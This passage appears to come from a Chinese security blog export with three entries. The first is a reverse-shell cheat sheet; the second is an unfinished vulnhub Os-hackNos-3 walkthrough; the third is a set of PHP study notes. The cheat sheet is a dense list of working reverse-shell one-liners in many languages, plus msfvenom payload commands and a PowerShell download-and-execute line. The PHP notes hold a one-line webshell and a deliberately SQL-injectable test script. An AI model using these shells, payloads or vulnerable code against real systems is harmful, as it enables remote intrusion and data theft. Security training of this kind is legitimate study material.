open(STDOUT,&quot;&gt;&amp;S&quot;);
open(STDERR,&quot;&gt;&amp;S&quot;);
exec(&quot;/bin/sh -i&quot;);
};</code></pre></li>
<li>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”[IPADDR]:[PORT]”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</li>
<li>perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”[IPADDR]:[PORT]”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’  #windows</li>
</ol>
<h3 id="0x14-python"><a href="#0x14-python" class="headerlink" title="0x14 python"></a>0x14 python</h3><ol>
<li>export RHOST=”192.168.100.4”;export RPORT=8888;python -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“/bin/sh”)’<pre><code>export RHOST=&quot;192.168.100.4&quot;;
export RPORT=8888;
python -c &#39;import sys,socket,os,pty;
s=socket.socket();
s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre></li>
<li>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.4”,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/bash”)’</li>
</ol>
<h3 id="0x15-PHP"><a href="#0x15-PHP" class="headerlink" title="0x15 PHP"></a>0x15 PHP</h3><ol>
<li>php -r ‘$sock=fsockopen(“192.168.100.4”,8888);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>
<li>php -r ‘$sock=fsockopen(“192.168.100.4”,8888);$proc=proc_open(“/bin/sh -i”, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);’</li>
</ol>
<h3 id="0x16-ruby"><a href="#0x16-ruby" class="headerlink" title="0x16 ruby"></a>0x16 ruby</h3><ol>
<li>ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</li>
<li>ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“[IPADDR]”,”[PORT]”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</li>
<li>ruby -rsocket -e ‘c=TCPSocket.new(“[IPADDR]”,”[PORT]”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’ #Windows only</li>
</ol>
<h3 id="0x17-Golang"><a href="#0x17-Golang" class="headerlink" title="0x17 Golang"></a>0x17 Golang</h3><ol>
<li>echo ‘package main;import”os/exec”;import”net”;func main(){c,_:=net.Dial(“tcp”,”192.168.0.134:8080”);cmd:=exec.Command(“/bin/sh”);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}’ &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</li>
</ol>
<h3 id="0x18-NCat"><a href="#0x18-NCat" class="headerlink" title="0x18 NCat"></a>0x18 NCat</h3><ol>
<li>ncat 192.168.100.4 8888 -e /bin/sh</li>
<li>ncat –udp 192.168.100.4 8888 -e /bin/sh</li>
</ol>
<h3 id="0x19-openssl"><a href="#0x19-openssl" class="headerlink" title="0x19 openssl"></a>0x19 openssl</h3><ol>
<li>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</li>
<li>openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</li>
<li>或者</li>
<li>ncat –ssl -vv -l -p 8888</li>
<li><ol start="2">
<li>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.100.4:8888 &gt; /tmp/s; rm /tmp/s</li>
</ol>
</li>
</ol>
<h3 id="0x1A-powershell"><a href="#0x1A-powershell" class="headerlink" title="0x1A powershell"></a>0x1A powershell</h3><ol>
<li>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(“192.168.100.4”,8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + “PS “ + (pwd).Path + “&gt; “;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</li>
<li></li>
<li>powershell -nop -c “$client = New-Object System.Net.Sockets.TCPClient(‘192.168.100.4’,8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”</li>
<li></li>
<li>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;" target="_blank" rel="noopener">https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;</a>)</li>
</ol>
<h3 id="0x1B-awk"><a href="#0x1B-awk" class="headerlink" title="0x1B awk"></a>0x1B awk</h3><ol>
<li>awk ‘BEGIN {s = “/inet/tcp/0/192.168.100.4/8888”; while(42) { do{ printf “shell&gt;” |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != “exit”) close(s); }}’ /dev/null</li>
</ol>
<h3 id="0x1C-java"><a href="#0x1C-java" class="headerlink" title="0x1C java"></a>0x1C java</h3><ol>
<li>r = Runtime.getRuntime()</li>
<li>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.100.4/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[])</li>
<li>p.waitFor()</li>
</ol>
<h3 id="0x1D-lua"><a href="#0x1D-lua" class="headerlink" title="0x1D lua"></a>0x1D lua</h3><ol>
<li>lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘192.168.100.4’,’8888’);os.execute(‘/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’);”</li>
<li>lua5.1 -e ‘local host, port = “192.168.100.4”,8888 local socket = require(“socket”) local tcp = socket.tcp() local io = require(“io”) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, “r”) local s = f:read(“*a”) f:close() tcp:send(s) if status == “closed” then break end end tcp:close()’</li>
</ol>
<h3 id="0x1E-NodeJS"><a href="#0x1E-NodeJS" class="headerlink" title="0x1E NodeJS"></a>0x1E NodeJS</h3><ol>
<li>require(‘child_process’).exec(‘nc -e /bin/sh 192.168.100.4 8888’)</li>
</ol>
<h3 id="0x1F-Groovy"><a href="#0x1F-Groovy" class="headerlink" title="0x1F Groovy"></a>0x1F Groovy</h3><ol>
<li>String host=”localhost”;</li>
<li>int port=8044;</li>
<li>String cmd=”cmd.exe”;</li>
<li>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</li>
</ol>
<h2 id="0x20-MSF"><a href="#0x20-MSF" class="headerlink" title="0x20 MSF"></a>0x20 MSF</h2><h3 id="0x21-war"><a href="#0x21-war" class="headerlink" title="0x21 war"></a>0x21 war</h3><ol>
<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f war &gt; reverse.war</li>
<li>strings reverse.war | grep jsp # in order to get the name of the file</li>
</ol>
<h3 id="0x22-Windows-Staged-reverse-TCP"><a href="#0x22-Windows-Staged-reverse-TCP" class="headerlink" title="0x22 Windows Staged reverse TCP"></a>0x22 Windows Staged reverse TCP</h3><ol>
<li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f exe &gt; reverse.exe</li>
</ol>
<h3 id="0x23-Windows-Stageless-reverse-TCP"><a href="#0x23-Windows-Stageless-reverse-TCP" class="headerlink" title="0x23 Windows Stageless reverse TCP"></a>0x23 Windows Stageless reverse TCP</h3><ol>
<li>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f exe &gt; reverse.exe</li>
</ol>
<h3 id="0x24-Linux-Staged-reverse-TCP"><a href="#0x24-Linux-Staged-reverse-TCP" class="headerlink" title="0x24 Linux Staged reverse TCP"></a>0x24 Linux Staged reverse TCP</h3><ol>
<li>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f elf &gt;reverse.elf</li>
</ol>
<h3 id="0x25-Linux-Stageless-reverse-TCP"><a href="#0x25-Linux-Stageless-reverse-TCP" class="headerlink" title="0x25 Linux Stageless reverse TCP"></a>0x25 Linux Stageless reverse TCP</h3><ol>
<li>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f elf &gt;reverse.elf</li>
</ol>
<h3 id="0x26-Other-platforms"><a href="#0x26-Other-platforms" class="headerlink" title="0x26 Other platforms"></a>0x26 Other platforms</h3><ol>
<li>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f elf &gt; shell.elf</li>
<li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f exe &gt; shell.exe</li>
<li>msfvenom -p osx/x86/shell_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f macho &gt; shell.macho</li>
<li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f asp &gt; shell.asp</li>
<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.jsp</li>
<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f war &gt; shell.war</li>
<li>msfvenom -p cmd/unix/reverse_python LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.py</li>
<li>msfvenom -p cmd/unix/reverse_bash LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.sh</li>
<li>msfvenom -p cmd/unix/reverse_perl LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.pl</li>
<li>msfvenom -p php/meterpreter_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</li>
</ol>
<h2 id="0x30-TTY-shell"><a href="#0x30-TTY-shell" class="headerlink" title="0x30 TTY shell"></a>0x30 TTY shell</h2><ol>
<li>socat file:<code>tty</code>,raw,echo=0 tcp-listen:12345</li>
<li>/bin/sh -i</li>
<li>python -c ‘import pty; pty.spawn(“/bin/sh”)’</li>
<li>perl -e ‘exec “/bin/sh”;’</li>
<li>perl: exec “/bin/sh”;</li>
<li>ruby: exec “/bin/sh”</li>
<li>lua: os.execute(‘/bin/sh’)</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></li>
<li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp</a></li>
</ol>
]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之Os-hackNos-3</title>
    <url>/vulnhub%E4%B9%8BOs-hackNos-3/</url>
    <content><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
<li>VBOX</li>
<li>靶场：192.168.11.3</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/1.png" alt></li>
</ol>
<h2 id="0x10-开始"><a href="#0x10-开始" class="headerlink" title="0x10 开始"></a>0x10 开始</h2><ol>
<li>netdiscover</li>
<li>找到靶机IP：192.168.11.3</li>
<li>nmap扫描端口：nmap -sT 192.168.11.3</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/2.png" alt></li>
<li>访问80端口</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/3.png" alt></li>
<li>啥都没有，有个关键字：<strong>websec</strong>，dirsearch扫目录</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/4.png" alt></li>
<li>访问/websec/目录</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/5.png" alt></li>
<li>再扫目录，找到个后台登陆/websec/admin/</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/6.png" alt></li>
<li>搜集到邮箱地址：<a href="mailto:contact@hacknos.com" target="_blank" rel="noopener">contact@hacknos.com</a></li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/7.png" alt></li>
<li>错误次数太多，封了~</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/8.png" alt></li>
</ol>
<h2 id="0x11-再来"><a href="#0x11-再来" class="headerlink" title="0x11 再来"></a>0x11 再来</h2><ol>
<li>使用cewl爬取网站 <a href="http://192.168.11.3/websec/" target="_blank" rel="noopener">http://192.168.11.3/websec/</a> 生成字典</li>
<li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/9.png" alt></li>
<li>未完</li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习</title>
    <url>/PHP%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0x00-PHP"><a href="#0x00-PHP" class="headerlink" title="0x00 PHP"></a>0x00 PHP</h2><ol>
<li>环境：phpstudy各版本PHP</li>
</ol>
<h2 id="0X01-PHP基础"><a href="#0X01-PHP基础" class="headerlink" title="0X01 PHP基础"></a>0X01 PHP基础</h2><p><strong>PHP标记</strong></p>
<ul>
<li>XML风格：起始标记：&lt;?php，结束标记：?&gt;</li>
<li>脚本风格：&lt;script language=”php”&gt;phpinfo();&lt;/script&gt;</li>
<li>短标记：&lt;?phpinfo();?&gt; #只有开启php.ini中的short_open_tag配置 或 编译PHP时加入–enable-short-tags选项，才能使用。</li>
<li>&lt;?=$_GET[0]($_POST[1]);?&gt; #GET：0=system  POST：1=whoami</li>
<li>asp风格：&lt;%phpinfo();%&gt; #开启php.ini中的asp_tags配置</li>
</ul>
<p><strong>指令分隔符</strong><br>多行使用；来分隔，最后一行可不要；</p>
<p><strong>注释</strong><br>//…<br>/<em>…</em>/<br>#…</p>
<p><strong><strong>FILE</strong> 预定义变量</strong></p>
<pre><code>echo __FILE__; #获取当前文件的完整路径</code></pre><p><strong>代码相关</strong></p>
<pre><code>highlight_file(__FILE__); #显示当前的代码
show_source(__FILE__); #显示当前的代码</code></pre><h2 id="0x02-PHP输出"><a href="#0x02-PHP输出" class="headerlink" title="0x02 PHP输出"></a>0x02 PHP输出</h2><ol>
<li>echo、print、print_r、var_dump()、var_export()</li>
</ol>
<p>echo 输出一个或多个字符串，和 print 最主要的不同之处是， echo 接受参数列表，并且没有返回值。<br>print 输出字符串，和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1<br>print_r()  以易于理解的格式打印变量。<br>var_dump() 打印变量的相关信息，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>var_export() 输出或返回一个变量的字符串表示，此函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</p>
<h2 id="0x03-目录相关"><a href="#0x03-目录相关" class="headerlink" title="0x03 目录相关"></a>0x03 目录相关</h2><p><strong>chdir(newdir) ——改变目录</strong></p>
<pre><code>&lt;?php
echo getcwd().&quot;\n&quot;;
chdir(&#39;/test&#39;);
echo getcwd().&quot;\n&quot;;
?&gt;</code></pre><p><strong>chroot() ——改变根目录</strong></p>
<p><strong>dir() ——返回一个 Directory 类实例</strong></p>
<pre><code>&lt;?php
$d=dir(&#39;./&#39;);
echo &quot;path: &quot;.$d-&gt;path.&quot;\n&quot;;
while(false!==($entry=$d-&gt;read())){
    echo $entry.&quot;\n&quot;;
}
$d-&gt;close();</code></pre><p><strong>getcwd() ——获取当前目录的路径</strong></p>
<pre><code>&lt;?php
echo getcwd();</code></pre><p><strong>opendir() ——打开目录</strong><br><strong>readdir() ——从目录句柄中读取条目</strong></p>
<pre><code>&lt;?php
if($d=opendir(&#39;./&#39;)){
    echo &quot;directory: $d \n&quot;;
    echo &quot;files: \n&quot;;
    while(false!==($file=readdir($d))){
        echo &quot;$file\n&quot;;
    }
}</code></pre><p><strong>scandir() ——列出指定路径中的文件和目录</strong></p>
<pre><code>var_dump(scandir(&#39;./&#39;)); #列出指定目录的文件或文件夹</code></pre><h2 id="0x10-PHP函数"><a href="#0x10-PHP函数" class="headerlink" title="0x10 PHP函数"></a>0x10 PHP函数</h2><p><strong>basename() ——返回路径中的文件名部分</strong><br><img src="/PHP%E5%AD%A6%E4%B9%A0/1.png" alt></p>
<p><strong>copy() ——拷贝文件</strong></p>
<pre><code>&lt;?php
copy(&#39;./1.txt&#39;,&#39;./2.txt&#39;); #源文件1.txt，目标文件2.txt

&lt;?php
copy(&#39;f:\\test\\1.txt&#39;,&#39;d:\\1.php&#39;);</code></pre><p><strong>dirname() ——返回路径中的目录部分</strong></p>
<pre><code>&lt;?php
echo dirname(&#39;f:\\test\\1.txt&#39;); #f:\test
echo dirname(&#39;/var/www/html/1.txt&#39;); #/var/www/html</code></pre><p><strong>disk_free_space() ——返回目录中的可用空间</strong></p>
<pre><code>&lt;?php
echo disk_free_space(&#39;f:&#39;); #F盘
echo disk_free_space(&#39;/&#39;); #</code></pre><p><strong>disk_total_space() ——返回一个目录的磁盘总大小</strong></p>
<pre><code>&lt;?php
echo disk_total_space(&#39;f:&#39;); #F盘</code></pre><p><strong>fclose() ——关闭一个已打开的文件指针</strong></p>
<pre><code>fclose(); #fopen();或fsockopen()</code></pre><p><strong>file_exists() ——检查文件或目录是否存在</strong></p>
<pre><code>&lt;?php  
echo file_exists(&#39;/var/&#39;); #1
echo file_exists(&#39;/var/www/html/test1.php&#39;); #1
echo file_exists(&#39;/var/www/html/test11.php&#39;); #存在即输出1，不存在不输出</code></pre><p><strong>file_get_contents() ——将整个文件读入一个字符串</strong></p>
<pre><code>&lt;?php
echo file_get_contents(&#39;./1.txt&#39;); </code></pre><p><strong>file_put_contents() ——将一个字符串写入文件</strong></p>
<pre><code>&lt;?php
$file=&#39;./1.txt&#39;;  #file_get_contents
$file_contents=file_get_contents($file);
$file_contents .=&#39;     file_put_contents&#39;;
file_put_contents($file,$file_contents); #1.txt： file_get_contents     file_put_contents</code></pre><p><strong>file() ——把整个文件读入到一个数组中</strong></p>
<pre><code>&lt;?php
$lines=file(&#39;1.txt&#39;);

foreach($lines as $line)
{
    echo($line);
}</code></pre><p><strong>filesize() ——获取文件大小</strong></p>
<pre><code>&lt;?php
echo filesize(&#39;./1.txt&#39;);</code></pre><p><strong>filetype() ——获取文件类型</strong></p>
<pre><code>&lt;?php
echo filetype(&#39;./1.txt&#39;);</code></pre><p><strong>fopen() ——打开文件或URL</strong></p>
<pre><code>&lt;?php
$file = fopen (&quot;1.txt&quot;,&quot;r&quot;);
if ($file) {
    while (!feof($file)) {
        $buffer = fgets($file, 4096);
        echo $buffer;
    }
    fclose($file);
}

&lt;?php
$file = fopen (&quot;http://192.168.100.1/1.txt&quot;,&quot;r&quot;);
if ($file) {
    while (!feof($file)) {
        $buffer = fgets($file, 4096);
        echo $buffer;
    }
    fclose($file);
}</code></pre><p><strong>fread() ——读取文件</strong></p>
<pre><code>&lt;?php
$file=fopen(&#39;./1.txt&#39;,&#39;r&#39;);
echo fread($file,&quot;10&quot;);  #读取10个字节
fclose($file);</code></pre><p><strong>is_dir() ——判断给定文件名是否一个目录</strong></p>
<pre><code>&lt;?php
echo is_dir(&#39;f:\\test\\&#39;);</code></pre><p><strong>is_executable() ——判断给定文件名是否可执行</strong></p>
<pre><code>is_executable($file)</code></pre><p><strong>is_file() ——判断给定文件名是否为一个正常的文件</strong><br><strong>is_link() ——判断给定文件名是否为一个符号连接</strong><br><strong>is_readable() ——判断给定文件名是否可读</strong></p>
<p><strong>is_uploaded_file() ——判断文件是否是通过 HTTP POST 上传的</strong></p>
<pre><code>&lt;?php
if (is_uploaded_file($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;])) {
   echo &quot;File &quot;. $_FILES[&#39;userfile&#39;][&#39;name&#39;] .&quot; uploaded successfully.\n&quot;;
   echo &quot;Displaying contents\n&quot;;
   readfile($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]);
} else {
   echo &quot;Possible file upload attack: &quot;;
   echo &quot;filename &#39;&quot;. $_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] . &quot;&#39;.&quot;;
}
?&gt;</code></pre><p><strong>mkdir() ——新建目录</strong></p>
<pre><code>&lt;?php
mkdir(&#39;./test/&#39;);  #脚本所在目录</code></pre><p><strong>move_uploaded_file() ——将上传的文件移动到新位置</strong></p>
<pre><code>&lt;?php
$uploads_dir = &#39;/uploads&#39;;
foreach ($_FILES[&quot;pictures&quot;][&quot;error&quot;] as $key =&gt; $error) {
    if ($error == UPLOAD_ERR_OK) {
        $tmp_name = $_FILES[&quot;pictures&quot;][&quot;tmp_name&quot;][$key];
        $name = $_FILES[&quot;pictures&quot;][&quot;name&quot;][$key];
        move_uploaded_file($tmp_name, &quot;$uploads_dir/$name&quot;);
    }
}
?&gt;</code></pre><p><strong>pathinfo() ——返回文件路径的信息</strong></p>
<pre><code>&lt;?php
$path_parts = pathinfo(&#39;f:\\test\\1.txt&#39;); 
echo $path_parts[&#39;dirname&#39;], &quot;\n&quot;; #f:\test
echo $path_parts[&#39;basename&#39;], &quot;\n&quot;; #1.txt
echo $path_parts[&#39;extension&#39;], &quot;\n&quot;; #txt
echo $path_parts[&#39;filename&#39;], &quot;\n&quot;;  #1
?&gt;</code></pre><p><strong>readfile() ——输出文件</strong></p>
<pre><code>&lt;?php
$file = &#39;./test1.php&#39;;
if (file_exists($file)) {
    header(&#39;Content-Description: File Transfer&#39;);
    header(&#39;Content-Type: application/octet-stream&#39;);
    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.basename($file).&#39;&quot;&#39;);
    header(&#39;Expires: 0&#39;);
    header(&#39;Cache-Control: must-revalidate&#39;);
    header(&#39;Pragma: public&#39;);
    header(&#39;Content-Length: &#39; . filesize($file));
    readfile($file);
    exit;
}
?&gt;</code></pre><p><strong>rename(oldname,newname) ——重命名一个文件或目录</strong></p>
<pre><code>&lt;?php
rename(&#39;./1.txt&#39;,&#39;./2.txt&#39;);</code></pre><p><strong>rmdir() ——删除目录</strong></p>
<pre><code>&lt;?php
if (!is_dir(&#39;examples&#39;)) {
    mkdir(&#39;examples&#39;);
}
rmdir(&#39;examples&#39;);
?&gt;</code></pre><p><strong>unlink() ——删除文件</strong><br>unlink(‘./1.txt’);  #删除当前文件夹的1.txt<br>unlink(‘f:\test\1.txt’);  #删除指定路径下的文件1.txt</p>
<h2 id="0x20-PHP与mysql"><a href="#0x20-PHP与mysql" class="headerlink" title="0x20 PHP与mysql"></a>0x20 PHP与mysql</h2><ol>
<li>mysql</li>
<li>mysqli（improved，改善的）(PHP V5以上)：只针对mysql</li>
<li>PDO（PHP DATA Objects）：适用12种数据库</li>
</ol>
<p><strong>mysqli</strong>（安装忽略）</p>
<ol>
<li><img src="/PHP%E5%AD%A6%E4%B9%A0/2.png" alt></li>
</ol>
<p><strong>PDO</strong>（安装忽略）</p>
<ol>
<li><img src="/PHP%E5%AD%A6%E4%B9%A0/3.png" alt></li>
</ol>
<h2 id="0x21-连接mysql"><a href="#0x21-连接mysql" class="headerlink" title="0x21 连接mysql"></a>0x21 连接mysql</h2><p><strong>mysql_connect()</strong></p>
<pre><code>&lt;?php 
#error_reporting(E_ALL^E_DEPRECATED);

$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root1&quot;);
if(!$connect)
{
    die(&quot;Connect failed~&quot;.mysql_error());
}
else
{
    die(&quot;succee&quot;);
}

#$connect-&gt;close(); #关闭连接
mysql_close($connect); #关闭连接
?&gt;</code></pre><ol>
<li><img src="/PHP%E5%AD%A6%E4%B9%A0/4.png" alt></li>
<li>提示：不推荐使用mysql_connect()</li>
<li>去掉提示可以选择：</li>
<li>一、修改php.ini里，display_errors = On 改为 display_errors = Off，修改后重启phpstudy</li>
<li>二、php代码里添加 error_reporting(E_ALL^E_DEPRECATED);（前面代码去掉注释符#）<br>账号或密码错误<pre><code>Connect failed~Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)</code></pre></li>
</ol>
<p><strong>mysqli_connect()</strong></p>
<pre><code>&lt;?php 
#error_reporting(E_ALL^E_WARNING);
$connect=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);

if(!$connect)
{
    die(&quot;Connect failed~ &quot;.mysqli_connect_error());
}
else
{
    die(&quot;succee&quot;);
}

mysqli_close($connect); #关闭连接
?&gt;</code></pre><p>账号或密码错误</p>
<pre><code>Connect failed~ Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)</code></pre><p><strong>PDO()</strong></p>
<pre><code>&lt;?php 
$host=&quot;127.0.0.1&quot;;
$user=&quot;root&quot;;
$pass=&quot;root1&quot;;
$dbhost=&quot;mysql:host=$host&quot;;
#$dbname=&quot;security&quot;;
#$dbhost_dbname=&quot;mysql:host=$host;dbname=$dbname&quot;;

try{
    $connect=new PDO($dbhost,$user,$pass);
    die(&quot;succee&quot;);

    $connect=null; #关闭连接
}
catch(PDOException $e)
{
    die($e-&gt;getMessage());
}


?&gt;</code></pre><p>账号或密码错误</p>
<pre><code>SQLSTATE[HY000] [1045] Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)</code></pre><p>绕过WAF注入测试脚本（数据库为sqli-labs的数据库security）</p>
<pre><code>&lt;?php 
error_reporting(E_ALL^E_DEPRECATED);
$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);

if(!$connect)
{
    die(&quot;Could not connect: &quot;.mysql_error());
}
mysql_select_db(&quot;security&quot;,$connect);
$id=$_REQUEST[&#39;id&#39;];
$query=&quot;select * from users where id=$id&quot;;
$result=mysql_query($query);

while($row=mysql_fetch_array($result))
{
    echo $row[&#39;0&#39;].&quot; &quot;.$row[&#39;1&#39;].&quot; &quot;.$row[&#39;2&#39;];
    echo &quot;&lt;br /&gt;&quot;;
}
echo &quot;&lt;br /&gt;&quot;;
echo $query;
mysql_close($connect);
?&gt;</code></pre><h2 id="0x30-PHP支持的协议和封装协议"><a href="#0x30-PHP支持的协议和封装协议" class="headerlink" title="0x30 PHP支持的协议和封装协议"></a>0x30 PHP支持的协议和封装协议</h2><p><strong>file://</strong></p>
<pre><code>&lt;?php
print_r(file_get_contents(&#39;file://f:\\test\\1.txt&#39;,&#39;r&#39;));</code></pre><h2 id="0x40-PHP运算符"><a href="#0x40-PHP运算符" class="headerlink" title="0x40 PHP运算符"></a>0x40 PHP运算符</h2><h3 id="0x41-比较运算符"><a href="#0x41-比较运算符" class="headerlink" title="0x41 比较运算符"></a>0x41 比较运算符</h3><ol>
<li><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">PHP比较运算符</a></li>
<li><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP类型比较表</a></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.php.net/manual/zh/index.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/index.php</a></li>
<li><a href="https://www.runoob.com/php/php-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
